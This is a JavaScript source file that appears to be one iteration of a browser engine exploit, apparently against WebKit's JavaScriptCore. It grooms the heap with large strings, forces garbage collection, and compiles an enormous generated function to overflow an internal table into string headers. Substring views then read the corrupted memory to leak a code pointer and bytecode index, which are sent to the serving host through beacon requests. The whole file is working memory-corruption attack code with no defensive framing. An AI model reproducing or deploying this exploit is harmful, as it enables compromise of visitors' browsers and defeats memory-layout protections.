// p147 — Substring view leak
// PROBLEM: every swept marge slot gets ~900 entries; one always lands at offset 0,
//          corrupting StringImpl header (m_data8 → crash on charCodeAt).
// FIX:     create substring VIEWS before overflow. View's own header is in
//          small-object heap (safe). View's m_data8 points to original string's
//          inline data. After corruption, reading the view reads entry bytes
//          directly — including m_slowPathCallDestination (LLInt code ptr).
//
// charCodeAt(0) = entry byte 24 = m_slowPathCallDestination[0]
// charCodeAt(7) = entry byte 31 = m_slowPathCallDestination[7]
// charCodeAt(44) = entry byte 68 = m_bytecodeIndex[0]
//
// Beacon prefix: V147L-

(function() {
  var B = function(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V147L-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  };

  B('BOOT');

  var workerCode = function() {
    var targets = [];
    var views = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V147L-W-' + tag + '?t=' + Date.now(), false);
        x.send();
      } catch(e) {}
    }

    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var count = e.data.count;
        for (var i = 0; i < count; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
          // Create substring VIEW — header in small-obj heap (safe from marge sweep)
          // m_data8 points to original's inline data (will be overwritten by entry)
          views.push(s.substring(0, 90000));
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        // Fast detect: poll .length on originals
        var found = false;
        var iterations = 0;
        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) { found = true; break; }
          }
          iterations++;
          if (iterations % 500000 === 0) beacon('POLL-' + iterations);
        }

        // Corruption detected — scan all strings
        var leaked = 0;
        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          if (len === STR_LEN) continue; // clean

          beacon('H-' + i + '-' + len);

          // Use the SUBSTRING VIEW to read entry data
          // View header is safe; view's m_data8 → original inline data
          // charCodeAt(0) = entry byte 24 (= m_slowPathCallDestination[0])
          try {
            // Read m_slowPathCallDestination (8 bytes at entry+24 = view[0..7])
            var ptr = '';
            for (var p = 0; p < 8; p++) ptr += hexByte(views[i].charCodeAt(p));
            beacon('PTR-' + i + '-' + ptr);

            // Read first 80 chars of view for full entry dump (entry bytes 24-103)
            var hex1 = '';
            for (var b = 0; b < 80; b++) hex1 += hexByte(views[i].charCodeAt(b));
            beacon('E1-' + i + '-' + hex1.substring(0, 160));
            beacon('E2-' + i + '-' + hex1.substring(160));

            // Read m_bytecodeIndex (4 bytes at entry+68 = view[44..47])
            var idx = '';
            for (var d = 44; d < 48; d++) idx += hexByte(views[i].charCodeAt(d));
            beacon('IDX-' + i + '-' + idx);

            leaked++;
          } catch(ex) {
            beacon('VIEW-ERR-' + i + '-' + (ex.message || '').substring(0, 30));
          }
        }
        beacon('LEAKED-' + leaked);
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  // PHASE 1: BAIT STRINGS
  var N_BAIT = 20;
  var STR_LEN = 100000;

  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-DONE-' + N_BAIT);

  // PHASE 2: WORKER TARGETS
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', count: 14 });

  // PHASE 3: FREE BAITS + GC
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-' + gcRound); phaseBuildOverflow(); }
    }
    gcPressureRound();
  }

  // PHASE 4: BUILD OVERFLOW
  function phaseBuildOverflow() {
    B('BUILD');
    var N_OVERFLOW = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N_OVERFLOW / CHUNK);
    var REM = N_OVERFLOW - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v147fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v147ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null; remChunk = null; parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v147ok ? 'OK' : 'FAIL'));
      if (!window.__v147fn) { B('NO-FN'); return; }

      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');
        try { window.__v147fn(function(){}); }
        catch(ex) { B('CATCH-' + (ex.message || '').substring(0, 30)); }
        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
